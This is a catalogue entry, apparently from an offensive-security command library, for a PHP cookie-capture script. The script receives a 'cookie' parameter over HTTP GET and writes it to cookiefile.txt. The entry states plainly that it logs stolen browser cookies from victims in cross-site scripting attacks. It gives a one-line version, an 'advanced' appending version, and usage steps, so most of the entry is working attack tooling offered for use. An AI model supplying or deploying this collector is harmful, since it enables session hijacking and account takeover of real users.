---
id: cmd-php-cookie-capture
data: >-
  <?php $cookie = $_GET['cookie']; $f = fopen("cookiefile.txt","w");
  fwrite($f,$cookie); fclose($f); ?>
tags:
  - exfiltration
  - php
type: command
output: Creates or overwrites 'cookiefile.txt' with the captured cookie data.
executor: php
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.191Z'
verified: false
validated: true
submitted: true
---
# php-cookie-capture

## Command

```php
<?php $cookie = $_GET['cookie']; $f = fopen("cookiefile.txt","w"); fwrite($f,$cookie); fclose($f); ?>
```

## Description

This PHP script captures the value of the 'cookie' GET parameter from an incoming HTTP request and writes it to a file named 'cookiefile.txt'. It is used in XSS exfiltration scenarios to log stolen browser cookies from a victim's session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_GET['cookie']` | Retrieves the cookie string passed in the URL query (e.g., ?cookie=sessionid=abc) | Yes |
| `fopen("cookiefile.txt","w")` | Opens the file in write mode, overwriting existing content | Yes |
| `fwrite($f,$cookie)` | Writes the captured cookie value to the file | Yes |
| `fclose($f)` | Closes the file handle to ensure data is flushed | Yes |

## Examples

### Basic Usage

Save as test.php and access via URL: http://localhost/test.php?cookie=sessionid=abc123

### Advanced Usage

Integrate into a larger script with error handling:

```php
<?php 
if (isset($_GET['cookie'])) { 
    $cookie = $_GET['cookie']; 
    $f = fopen("cookiefile.txt","a"); // Append mode 
    fwrite($f, $cookie . "\n"); 
    fclose($f); 
    echo "Captured"; 
} else { 
    echo "No cookie provided"; 
}
?>
```

## Expected Output

Upon successful request, the file 'cookiefile.txt' is created or updated with the cookie value, e.g., "sessionid=abc123; user=guest". No stdout output unless added; check file contents post-execution.

## Related

- [[Related Procedure: Set-Up-Local-PHP-Server-for-Cookie-Capture]]
